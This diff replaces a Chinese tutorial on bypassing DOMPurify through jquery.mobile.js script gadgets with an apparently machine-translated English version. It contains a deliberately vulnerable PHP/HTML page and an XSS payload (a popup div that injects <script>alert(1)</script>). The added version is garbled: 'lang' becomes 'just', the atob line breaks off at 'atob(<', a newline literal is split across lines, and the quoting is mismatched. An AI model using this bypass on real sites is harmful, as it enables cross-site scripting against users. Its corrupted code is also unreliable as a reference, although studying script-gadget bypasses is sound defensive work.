@@ -1,51 +1,52 @@
 Bypass Via Script Gadgets
 ================================
 
-简介
+Introduction
 --------------------------------
-一些网站会使用白名单或者一些基于DOM的防御方式，对这些方式，有一种被称为 ``Code Reuse`` 的攻击方式可以绕过。该方式和二进制攻防中的Gadget相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets`` 中有该方法的具体描述。
+Some websites use whitelists or some DOM-based defense methods. For these methods, there is an attack method called "Code Reuse" that can be bypassed. This method is similar to Gadget in binary offense and defense, using legitimate code in the target to bypass defense measures. There is a specific description of this method in the paper ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets`.
 
-portswigger的一篇博文也表达了类似的想法 ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``。
+A blog post by portswigger also expressed similar ideas ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``.
 
-下面有一个简单的例子，这个例子使用了 ``DOMPurify`` 来加固，但是因为引入了 ``jquery.mobile.js`` 导致可以被攻击。
+Here is a simple example. This example uses ``DOMPurify`` to reinforce, but it can be attacked because of the introduction of ``jquery.mobile.js``.
 
-例子
+example
 --------------------------------
 ::
 
-    // index.php
-    <?php
+// index.php
+<?php
 
-    $msg = $_GET['message'];
-    $msg = str_replace("\n", "", $msg);
-    $msg = base64_encode($msg);
+$msg = $_GET['message'];
+$msg = str_replace("
+", "", $msg);
+$msg = base64_encode($msg);
 
-    ?>
+?>
 
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <title>Preview</title>
-        <script type="text/javascript" src="purify.js"></script>
-        <script type="text/javascript" src="jquery.js"></script>
-        <script type="text/javascript" src="jquery.mobile.js"></script>
-    </head>
-    <body>
-        
-        <script type="text/javascript">
-        var d= atob('<?php echo $msg; ?>');
-        var cleanvar = DOMPurify.sanitize(d);
-        document.write(cleanvar);
-        </script>
+<!DOCTYPE html>
+<html just= "en">
+<head>
+<meta charset="UTF-8">
+<title>Preview</title>
+<script type="text/javascript" src="purify.js"></script>
+<script type="text/javascript" src="jquery.js"></script>
+<script type="text/javascript" src="jquery.mobile.js"></script>
+</head>
+<body>
 
-    </body>
-    </html>
+<script type="text/javascript">
+var d= atob(<
+var cleanvar = DOMPurify.sanitize(d);
+document.write(cleanvar);
+</script>
+
+</body>
+</html>
 
 
 ::
 
-    // payload
-    <div data-role=popup id='-->
-    &lt;script&gt;alert(1)&lt;/script&gt;'>
-    </div>
+// payload
+<div data-role=popup id='-->
+<script>alert(1)</script>'>
+</div>
